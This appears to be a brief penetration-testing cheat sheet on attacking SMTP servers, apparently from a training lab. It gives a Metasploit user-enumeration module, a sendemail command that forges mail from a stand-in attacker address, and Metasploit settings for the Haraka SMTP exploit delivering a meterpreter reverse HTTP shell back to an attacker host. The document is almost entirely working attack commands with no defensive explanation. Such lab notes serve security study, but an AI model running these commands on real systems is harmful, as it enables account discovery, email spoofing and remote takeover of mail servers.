## SMTP User Enumeration Utility

```text
msf6 > use auxiliary/scanner/smtp/smtp_enum
```

## Connect to SMTP Service Using Telnet

```bash
telnet <T_IP> 25
```

## Send a Fake Mail Using sendemail

```bash
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s <ip> -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

## SMTP 2.8.9 Vulnerability

```text
use exploit/linux/smtp/haraka

set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost <T_IP>
set LHOST <L_IP>
```
